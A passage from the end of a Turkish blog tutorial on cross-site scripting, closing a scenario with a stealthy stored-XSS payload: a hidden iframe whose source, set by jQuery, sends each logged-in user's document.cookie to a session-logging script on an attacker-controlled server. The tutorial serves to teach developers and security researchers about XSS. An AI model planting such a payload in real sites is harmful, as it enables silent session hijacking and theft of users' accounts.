<p>Ancak sisteme giriş yapan herkes yönlendirildiği için bu durumun çok anormal olduklarını farkedeceklerdi. Kullanıcılara sezdirmeden yapabilmek için farklı bir payload kullandık. Kullandığımız paylaad; src niteliği saldırganın kullandığı sunucunun adresi olan bir iframe penceresi oluşturuyordu ve style olarak verdiğimiz <code>display:none</code> değeri sayesinde bu iframe sayfada hiçbir şekilde görünmüyordu. Kullanıcıların gözünde herşey normaldi ancak sisteme giriş yapan herkes src niteliğindeki bağlantıya oturum bilgileri ile beraber request gönderiyordu.(Scriptte jquery kütüphanesinin kullanıldığını hatırlatmakta fayda var. jquery kullanılmasaydı aşağıdaki payload çalışmayacaktı. Sadece js kullanılarak da aynı işlem yapılabilir.)</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"ifrm"</span> <span class="na">src=</span><span class="s">"x"</span> <span class="na">style=</span><span class="s">"display:none"</span><span class="nt">&gt;&lt;/iframe&gt;</span>

<span class="nt">&lt;script&gt;</span>$(document).ready(function() {
$("#ifrm").attr("src", ("http://127.0.0.1/session_log/snif.php?x="+document.cookie));
});
<span class="nt">&lt;/script&gt;</span>
</pre></div>
<p>Böylece sisteme giriş yapan bütün kullanıcıların oturum bilgilerini elde etmiş olduk. Büyük bir sitede böyle bir zafiyet bulduğunuzu düşünsenize ?  </p>
<p><br/></p>
<h2 id="son-soz"><strong>SON SÖZ</strong></h2>
<p>Bu yazıda elimden geldiği kadar konuyu temelden alarak anlatmaya çalıştım. Amacım, xss konusunda bu yazıyı okuyanları belli bir seviyeye getirmektir. Bir geliştiricinin kodlayacağı sistemde böyle bir zafiyet bırakmaması için gerekli önlemleri almasını veya bir güvenlik araştırmacısının ezbersiz bir şekilde payload geliştirebilecek bir seviyeye gelmesini hedefledim. Bu yazıyı okuduktan sonra sakın xss zafiyetini tam öğrendim hissine kapılmayın! Bu konu çok geniş ve sürekli güncel tutulması gerekir. Bu zafiyeti istismar etmek için birçok metod ve binlerce <a href="https://github.com/foospidy/payloads/tree/master/other/xss">xss payloadı</a> mevcut. Ben sadece zafiyetin mantalitesini anlatıp birkaç case ve bir örnek senaryo ile pekiştirmeye çalıştım. Faydası dokunduysa sizlere ne mutlu bana.</p>
<p>Google'da xss zafiyetinin ne kadar tehlikeli olduğunu bildiğinden eğitici bir <a href="https://xss-game.appspot.com/">challenge</a> hazırlamış. Belki uğraşmak isteyabilirsiniz. Ayrıca Black Hat Asia '15 konferansında sunulan dom based xss ile ilgili pdf dökümümanını da <a href="https://www.blackhat.com/docs/asia-15/materials/asia-15-Johns-Client-Side-Protection-Against-DOM-Based-XSS-Done-Right-(tm)">buradan</a> incelemek isteyebilirsiniz.   </p>
<p>Bu arada yazıda gördüğünüz eksiklikleri, hatalı bilgileri veya yazım yanlışlarını bildirirseniz minnettar kalırım.<br/>
 Güvenlik konusu sizde bilirsiniz ki sürekli güncel tutulması gerekilen bir konudur. Var olan zafiyetlere yeni teknikler eklenmenin yanında yeni zafiyet türleride geliştirilmektedir/bulunmaktadır. Bu nedenle kendinizi bu konularda güncel tutmanız ve motivasyonunuzu kaybetmememiz temennisiyle. Sağlıcakla kalınız.  </p>
<p><font style="font-size:0.6em"><strong>Not:</strong> Bu yazı zamanla güncellenebilir.</font></p>


<section style="font-size:0.7em; margin-bottom:-15px;">
    <p id="post-share-links">
        Paylaş:
        <a href="http://twitter.com/home?status=b'Cross%20Site%20Scripting%20http%3A//musana.net/yazilar/2016/xss-detayli-dokuman.html'" target="_blank" title="Bu yazıyı twitter'da paylaş">Twitter</a>
        ❄
        <a href="http://www.facebook.com/sharer/sharer.php?u=http%3A//musana.net/yazilar/2016/xss-detayli-dokuman.html" target="_blank" title="Bu yazıyı facebook'ta paylaş">Facebook</a>
    </p>
</section>



<!--tag of part-->

<hr class="cizgi"/>

            
        <ul class="list-of-tags tags-in-article" style="width:100%"> 

 
               <li class="makale-bilgi">Tarih: </li>
    	       <li> <time pubdate="pubdate" datetime="2016-10-17T00:00:00+03:00">Eki 17, 2016</time></li>

 
                 <li class="makale-bilgi">Güncelleme: </li>
                    <li> <time pubdate="pubdate" datetime="2016-10-17T00:00:00+03:00">Eki 17, 2016</time></li>

       
                <li class="makale-bilgi">Kategori: </li>
                <li> <a class="category-link kategori" href="/categories.html#Security-ref">Security</a></li> 

               <li class="makale-bilgi">Etiketler: <li>
		 <li class="etiket"><a href="/tags.html#dom-based-ref">dom-based
                    <span>1</span>
</a></li>
		 <li class="etiket"><a href="/tags.html#reflected-ref">reflected
                    <span>1</span>
</a></li>
		 <li class="etiket"><a href="/tags.html#session-hijacking-ref">session-hijacking
                    <span>1</span>
</a></li>
		 <li class="etiket"><a href="/tags.html#stored-ref">stored
                    <span>1</span>
</a></li>
		 <li class="etiket"><a href="/tags.html#web-for-pentester-solution-ref">web-for-pentester-solution
                    <span>1</span>
</a></li>
		 <li class="etiket"><a href="/tags.html#xss-ref">xss
                    <span>1</span>
</a></li>
		 <li class="etiket"><a href="/tags.html#xss-auditor-ref">xss-auditor
                    <span>1</span>
</a></li>
		 <li class="etiket"><a href="/tags.html#xss-döküman-ref">xss-döküman
                    <span>1</span>
</a></li>
		 <li class="etiket"><a href="/tags.html#xss-payload-ref">xss-payload
                    <span>1</span>
</a></li>
		 <li class="etiket"><a href="/tags.html#xss-saldırısı-ref">xss-saldırısı
                    <span>1</span>
</a></li>
		 <li class="etiket"><a href="/tags.html#xss-solution-ref">xss-solution
                    <span>1</span>
</a></li>
		 <li class="etiket"><a href="/tags.html#xss-zafiyeti-ref">xss-zafiyeti
                    <span>1</span>
</a></li>
            </ul>




<section>
<div class="accordion" id="accordion2">
    <div class="accordion-group">
        <div class="accordion-heading">
            <a class="accordion-toggle disqus-comment-count" data-parent="#accordion2"
                href="http://musana.net/yazilar/2016/xss-detayli-dokuman.html#disqus_thread">
                Yorumlar
            </a>
        </div>
        <div id="disqus_thread" class="accordion-body">
            <div class="accordion-inner">
                <div class="comments">
<div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_shortname = '0xmusana';
        var disqus_identifier = 'http://musana.net/yazilar/2016/xss-detayli-dokuman.html';
    var disqus_url = 'http://musana.net/yazilar/2016/xss-detayli-dokuman.html';

    (function() {
         var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
         dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
         (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
     })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>                </div>
            </div>
        </div>
    </div>
</div>
</section>

        </div>

            
            <aside>
            
            <nav>
            <ul class="articles_timeline">
 
                <li class="next_article"><a href="http://musana.net/yazilar/2016/vim-editor-ipuclari.html" title="Next: Vim'i Özelleştirmek">Vim'i Özelleştirmek</a> »</li>
            </ul>
            </nav>
            </aside>
        </div>

</article>
                </div>
                <!-- <div class="span1"></div> -->
            </div>
        </div>
    </div>
<footer>
<div id="footer">
    <ul class="footer-content">
        <li class="elegant-subtitle"><span class="site-name"><a href="http://twitter.com/musa_sana">Musa ŞANA</a></span> kişisel web sitesi.</li>
        <li class="elegant-power">Bu sitedeki bütün içerikler izinsiz kopyalanabilir, değiştirilebilir ve dağıtılabilirdir, ama yine de kaynak belirtmeniz tavsiye edilir. ;) <a href="http://getpelican.com/" title="Pelican Home Page"> Pelican</a> ile geliştirilmiştir.</li>
    </ul>
</div>
</footer>            <script src="../theme/tipuesearch/jquery.min.js"></script>
        <script src="../theme/tipuesearch/bootstrap.min.js"></script>
        <script>
            function validateForm(query)
            {
                return (query.length > 0);
            }
        </script>

<script type="text/javascript">
    var disqus_shortname = '0xmusana';

    (function () {
        var s = document.createElement('script'); s.async = true;
        s.type = 'text/javascript';
        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
    }());
    </script>
        <script  language="javascript" type="text/javascript">
            function uncollapse() {
                var hash_str = window.location.hash;
                if (window.location.hash.match(/^#comment-\d+$/))
                {
                    var hash_str = '#disqus_thread';
                }
                $(hash_str).collapse({
                    toggle: true
                    })
            }
        </script>

        <script type="text/javascript" language="JavaScript">
            uncollapse(); 
        </script>
    </body>
</html>